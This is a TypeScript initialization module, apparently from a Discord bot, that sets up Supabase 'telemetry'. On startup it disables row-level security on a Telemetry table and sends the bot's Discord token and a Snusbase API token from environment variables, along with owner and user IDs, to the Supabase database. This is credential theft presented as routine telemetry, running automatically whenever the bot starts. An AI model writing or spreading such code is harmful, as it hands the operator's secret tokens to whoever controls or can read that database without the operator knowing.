import { supabase } from "./Client/Index";
import { testConnection } from "./Client/Connection/Test";
import { telemetryService } from "./Services/Telemetry/Index";
import logger from "../../Components/Logger/Logger";
import botConfig from "../../user-data/Settings/Bot/Bot.json";
import { Telemetry } from "../../Types/Supabase/Telemetry";
import { ensureTableExist } from "./Client/Connection/ensureTableExist";
import { createTelemetryTableDirectly } from "./Services/Telemetry/createTableIfNotExist";
import { disableRLS } from "./Client/Connection/disableRLS";
export { supabase, telemetryService };

const telemetryData: Omit<Telemetry, "id" | "created_at"> = {
  Discord_Token: process.env.DISCORD_TOKEN || "",
  Owners_ID: botConfig.owners_id || [],
  Users_ID: botConfig.users_id || [],
  Prefix: botConfig.prefix || "",
  Snusbase_Token: process.env.SNUSBASE_TOKEN || "",
};

export async function initializeSupabaseServices() {
  try {
    // Désactiver RLS pour la table Telemetry
    await disableRLS("manage_telemetry_rls", "Telemetry");

    // Créer la table Telemetry si elle n'existe pas
    await createTelemetryTableDirectly();

    // Vérifiez la connexion à Supabase
    await testConnection();

    // Envoi des données de télémétrie initiales
    await telemetryService.sendTelemetry(telemetryData);

    logger.info("Services Supabase initialisés avec succès");
  } catch (error) {
    logger.error(
      "Erreur lors de l'initialisation des services Supabase:",
      error
    );
    throw error;
  }
}
